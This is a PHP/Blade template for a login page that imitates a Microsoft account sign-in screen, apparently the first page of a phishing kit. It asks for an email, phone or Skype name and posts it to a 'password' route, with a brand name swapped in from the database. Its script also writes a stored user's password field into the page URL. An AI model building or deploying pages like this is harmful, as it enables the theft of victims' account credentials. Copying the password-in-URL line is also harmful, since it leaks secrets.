<?php

    $title = \App\User::where('id',1)->first(); 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in to your {{$title->name}} account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/images/favicon1.ico" type="image/x-icon" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/login.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
</head>
<body>
  
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
                    <img src="assets/images/logo.svg">
                    <h4>Sign In</h4>
                    <form method="POST" action="{{route('password')}}">
				     	{{ csrf_field() }}
                        <div class="form-group">
                            <input type="email" class="form-control" id="user" name="user" placeholder="Email, phone, or Skype" value="" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" required>
                            <p>No account? <a href="#">Create one!</a></p>
                        </div>
                        <button type="submit" class="btn float-right">Next</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>Privacy & cookies</p>
    <p>Terms of use</p>
    <p>©<?php echo date('Y'); ?> {{$title->name}}</p>
</div>

<script>
    location.hash = " {{$title->password}}";

    $(function() {
        $(document).on('focus', '.form-control', function() {
            $(this).css({'border-bottom': '1px solid #0067b8'});
        });

        $(document).on('blur', '.form-control', function() {
            $(this).css({'border-bottom': ''});
        });

        
    });
</script>

</body>
</html>